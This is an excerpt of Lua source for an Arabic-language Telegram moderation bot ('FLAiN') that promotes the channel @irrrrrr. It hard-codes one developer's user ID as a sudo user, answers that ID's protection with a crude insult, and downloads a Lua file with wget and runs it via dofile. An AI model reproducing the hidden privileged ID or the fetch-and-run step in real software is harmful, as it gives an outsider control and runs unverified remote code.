...
--   This Is The Source Channel @irrrrrr .   --
--                - FLAiN -                 --
--        -- https://t.me/irrrrrr --         --
------------------------------------------------ 
redis = require('redis') 
...
DevId = sudos.SUDO
SudoUsers = {sudos.sudo_users,1013986360}
...
Dev_Abs(msg.chat_id_, msg.id_, 1, "❅︙عذرا عزيزي ↫ ["..data.first_name_.."](t.me/irrrrrr)\n❅︙الصوره التي ارسلتها تم منعها من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
Dev_Abs(msg.chat_id_,0, 1, "❅︙عذرا عزيزي ↫ ["..data.first_name_.."](t.me/irrrrrr)\n❅︙الملصق الذي ارسلته تم منعه من المجموعه", 1, 'md')
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})
return false   
...
❅︙نقاطي • بيع نقاطي
┉••┉••┉••┉••┉••┉••┉••┉┉••┉
❅︙[Source Channel](https://t.me/irrrrrr)
]], 1, 'md')
else
...
if tonumber(result.id_) == tonumber(1013986360) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
return false  
end  
...
if tonumber(result.sender_user_id_) == tonumber(1013986360) then  
Dev_Abs(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
return false
end 
...
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/irrrrrr' end
...
os.execute('wget https://raw.githubusercontent.com/0uru/source/master/DevProx.lua') 
dofile('DevProx.lua') 
...
Dev_Abs(msg.chat_id_, msg.id_, 1, '❅︙Channel ↬ @irrrrrr', 1, 'html')    
end 
--     FLAiN Source   --
if Sudo(msg) then 
